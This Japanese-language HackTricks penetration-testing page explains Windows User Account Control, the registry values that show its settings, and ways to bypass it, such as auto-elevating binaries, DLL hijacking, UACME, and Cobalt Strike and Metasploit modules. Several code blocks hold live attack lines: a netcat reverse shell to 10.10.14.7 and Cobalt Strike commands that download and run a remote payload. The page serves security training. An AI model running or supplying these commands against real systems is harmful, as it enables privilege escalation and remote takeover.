# UAC - ユーザーアカウント制御

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のある**タスクを実行できます。UACが有効になっている場合、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストの下で実行され**、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可しない限り、システムを実行することはできません。これは、管理者が意図しない変更から保護される便利な機能ですが、セキュリティ境界とは見なされません。

インテグリティレベルに関する詳細情報:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UACが有効な場合、管理者ユーザーには2つのトークンが与えられます：通常のアクションを通常レベルで実行するための標準ユーザーキーと、管理者権限を持つものです。

この[ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、UACの動作について詳細に説明しており、ログオンプロセス、ユーザーエクスペリエンス、UACアーキテクチャが含まれています。管理者は、セキュリティポリシーを使用して、ローカルレベルで自組織に特有のUACの動作を構成することができ（secpol.mscを使用）、またはActive Directoryドメイン環境でグループポリシーオブジェクト（GPO）を介して構成して展開することができます。さまざまな設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UACに設定できるグループポリシー設定は10個あります。以下の表は追加の詳細を提供します：

| グループポリシー設定                                                                                                                                                                                                                                                                                                                                                           | レジストリキー                | デフォルト設定                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [ユーザーアカウント制御：組み込みの管理者アカウントの管理者承認モード](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 無効                                                       |
| [ユーザーアカウント制御：UIAccessアプリケーションがセキュアデスクトップを使用せずに昇格を要求できるようにする](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 無効                                                       |
| [ユーザーアカウント制御：管理者の昇格プロンプトの動作（管理者承認モード）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を求めるプロンプト            |
| [ユーザーアカウント制御：標準ユーザーの昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | セキュアデスクトップでの資格情報を求めるプロンプト        |
| [ユーザーアカウント制御：アプリケーションのインストールを検出し、昇格を要求する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 有効（ホームのデフォルト）無効（エンタープライズのデフォルト） |
| [ユーザーアカウント制御：署名され、検証された実行可能ファイルのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 無効                                                       |
| [ユーザーアカウント制御：セキュアな場所にインストールされたUIAccessアプリケーションのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 有効                                                       |
| [ユーザーアカウント制御：すべての管理者を管理者承認モードで実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 有効                                                       |
| [ユーザーアカウント制御：昇格を要求する際にセキュアデスクトップに切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 有効                                                       |
| [ユーザーアカウント制御：ファイルおよびレジストリの書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 有効                                                       |

### UACバイパス理論

一部のプログラムは、**ユーザーが** **管理者グループに属している場合**、**自動的に自動昇格**されます。これらのバイナリには、_**Manifests**_ 内に _**autoElevate**_ オプションが _**True**_ の値で含まれています。バイナリは、**Microsoftによって署名されている必要があります**。

次に、**UACをバイパスする**ために（**中**のインテグリティレベルから**高**に昇格する）、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高いレベルのインテグリティプロセス**から実行されるからです。

バイナリの_**Manifest**_を確認するには、Sysinternalsのツール_**sigcheck.exe**_を使用できます。また、_Process Explorer_または_SysinternalsのProcess Monitor_を使用してプロセスの**インテグリティレベル**を確認できます。

### UACの確認

UACが有効かどうかを確認するには、次の操作を行います：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
もしそれが **`1`** であれば、UACは **有効** です。もしそれが **`0`** であるか、**存在しない** のであれば、UACは **無効** です。

次に、**どのレベル** が設定されているかを確認します：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* **`0`** の場合、UACはプロンプトを表示しません（**無効**のように）
* **`1`** の場合、管理者は**ユーザー名とパスワード**を要求されて、バイナリを高い権限で実行します（セキュアデスクトップ上で）
* **`2`** の場合（**常に通知**）、UACは管理者が高い権限で何かを実行しようとするたびに常に確認を求めます（セキュアデスクトップ上で）
* **`3`** の場合、`1` と同様ですが、セキュアデスクトップ上で必要ありません
* **`4`** の場合、`2` と同様ですが、セキュアデスクトップ上で必要ありません
* **`5`** の場合（**デフォルト**）、非Windowsバイナリを高い権限で実行するために管理者に確認を求めます

次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります。\
値が **`0`** の場合、**RID 500** ユーザー（**組み込みの管理者**）のみが**UACなしで管理タスク**を実行でき、`1` の場合は、**「Administrators」** グループ内のすべてのアカウントがそれを実行できます。

最後に、キー **`FilterAdministratorToken`** の値を確認します。\
**`0`**（デフォルト）の場合、**組み込みの管理者アカウントは**リモート管理タスクを実行でき、**`1`** の場合、組み込みの管理者アカウントは**リモート管理タスクを実行できません**が、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合を除きます。

#### 概要

* `EnableLUA=0` または **存在しない**場合、**誰に対してもUACなし**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1`** の場合、誰に対してもUACなし
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=0`** の場合、RID 500（組み込みの管理者）に対してUACなし
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=1`** の場合、全員に対してUACあり

このすべての情報は、**metasploit** モジュール `post/windows/gather/win_privs` を使用して収集できます。

ユーザーのグループを確認し、整合性レベルを取得することもできます。
```
net user %username%
whoami /groups | findstr Level
```
## UACバイパス

{% hint style="info" %}
被害者にグラフィカルアクセスがある場合、UACバイパスは簡単です。UACプロンプトが表示されたときに「はい」をクリックするだけです。
{% endhint %}

UACバイパスは以下の状況で必要です: **UACが有効で、プロセスが中程度の整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。

UACが最高のセキュリティレベル（常に）に設定されている場合、他のレベル（デフォルト）の場合よりも**UACをバイパスするのははるかに難しい**ことを言及することが重要です。

### UAC無効

UACがすでに無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、次のようなもので**管理者権限でリバースシェルを実行**できます:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UACバイパスとトークン複製

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に** 基本的なUAC "バイパス"（フルファイルシステムアクセス）

管理者グループに属するユーザーのシェルがある場合、**C$** 共有をSMB（ファイルシステム）経由で新しいディスクにマウントすることで、**ファイルシステム内のすべてにアクセスできます**（管理者のホームフォルダも含む）。

{% hint style="warning" %}
**このトリックはもう機能していないようです**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UACバイパスとCobalt Strike

Cobalt Strikeの技術は、UACが最大のセキュリティレベルに設定されていない場合にのみ機能します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **バイパス** するためのいくつかのモジュールがあります。

### KRBUACBypass

ドキュメントとツールは [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC バイパスエクスプロイト

[**UACME**](https://github.com/hfiref0x/UACME) は、いくつかの UAC バイパスエクスプロイトの **コンパイル** です。**UACME を Visual Studio または msbuild を使用してコンパイルする必要があります**。コンパイルにより、いくつかの実行可能ファイル（例えば `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されます。**どれが必要かを知っておく必要があります。**\
**注意が必要です**。なぜなら、いくつかのバイパスは **他のプログラムを促す** ことがあり、**ユーザー** に何かが起こっていることを **警告** します。

UACME には、各技術が動作し始めた **ビルドバージョン** があります。あなたのバージョンに影響を与える技術を検索できます：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.

#### More UAC bypass

**すべて**の技術は、AUCをバイパスするために**完全なインタラクティブシェル**を必要とします（一般的なnc.exeシェルでは不十分です）。

**meterpreter**セッションを使用して取得できます。**Session**値が**1**の**プロセス**に移行します：

![](<../../.gitbook/assets/image (863).png>)

(_explorer.exe_ は動作するはずです)

### UAC Bypass with GUI

**GUIにアクセスできる場合は、UACプロンプトが表示されたときにそれを受け入れるだけで済みます。** バイパスは本当に必要ありません。したがって、GUIにアクセスすることでUACをバイパスできます。

さらに、誰かが使用していたGUIセッション（おそらくRDP経由）を取得した場合、**管理者として実行されるいくつかのツール**があり、そこから**cmd**を例えば**管理者として**直接実行でき、再度UACによるプロンプトが表示されることはありません。 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。これは少し**ステルス**かもしれません。

### Noisy brute-force UAC bypass

騒がしくなることを気にしない場合は、常に**次のようなものを実行できます** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) それは**ユーザーが受け入れるまで権限を昇格するように要求します**。

### Your own bypass - Basic UAC bypass methodology

**UACME**を見てみると、**ほとんどのUACバイパスはDLLハイジャックの脆弱性を悪用しています**（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。 [DLLハイジャックの脆弱性を見つける方法を学ぶには、これを読んでください](../windows-local-privilege-escalation/dll-hijacking/)。

1. **自動昇格**するバイナリを見つけます（実行時に高い整合性レベルで実行されることを確認します）。
2. procmonを使用して、**DLLハイジャック**に脆弱な"**NAME NOT FOUND**"イベントを見つけます。
3. おそらく、**書き込み権限がない**いくつかの**保護されたパス**（C:\Windows\System32など）内にDLLを**書き込む**必要があります。これを回避するには、次のものを使用できます：
   1. **wusa.exe**：Windows 7,8および8.1。これは、保護されたパス内にCABファイルの内容を抽出することを許可します（このツールは高い整合性レベルから実行されるため）。
   2. **IFileOperation**：Windows 10。
4. 保護されたパス内にDLLをコピーし、脆弱で自動昇格されたバイナリを実行するための**スクリプト**を準備します。

### Another UAC bypass technique

**自動昇格されたバイナリ**が**実行される**ための**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとする**のを監視することに基づいています（これは、バイナリが**HKCU**内でこの情報を検索する場合により興味深いです）。

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
